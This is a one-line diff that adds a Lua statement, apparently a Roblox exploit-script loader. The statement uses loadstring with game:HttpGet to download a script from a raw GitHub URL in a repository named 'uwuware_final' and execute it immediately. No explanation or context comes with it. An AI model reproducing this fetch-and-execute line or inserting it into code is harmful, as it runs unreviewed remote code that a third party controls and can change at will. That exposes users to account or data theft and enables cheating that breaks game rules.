@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jan5106/uwuware_final/main/main.lua", true))()
